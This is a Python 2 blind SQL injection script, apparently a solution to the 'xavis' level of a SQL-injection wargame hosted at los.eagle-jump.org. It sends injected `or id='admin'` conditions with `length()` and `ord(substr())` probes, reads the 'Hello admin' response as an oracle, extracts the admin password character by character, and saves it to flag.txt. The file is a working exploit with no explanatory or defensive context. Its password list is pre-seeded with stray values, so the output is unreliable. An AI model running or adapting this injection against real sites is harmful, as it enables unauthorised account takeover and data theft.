#-*- coding: utf-8 -*-
import string, sys
from web import *

url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw={}"

# get length
length = 40
inject_url = "' or id='admin' and length(pw)='{}"

for i in range(100):
    req = getRequest(url, inject_url.format(i))
    page = getPage(req)
    if "Hello admin" in page:
            print "Length :",i
            length = i
            break


# get password : brute forcing : for admin
password=[184, 249, 197, 176, 198, 208, 196, 161, 164, 187]
inject_url = "' or id='admin' and ord(substr(pw,{},1))='{}"

for i in range(1,length+1):
    for c in range(10000):
        req = getRequest(url, inject_url.format(i,c), show=False)
        page = getPage(req)
        if "Hello admin" in page:
            print "Find Admin, I will append it",i,c
            password.append(c)
            break

    print "Check[{}] password = {}".format(i, password)
    print "-"*20

print "",
toFile("flag.txt","Password :".encode("utf-8") + toUnicode(password))
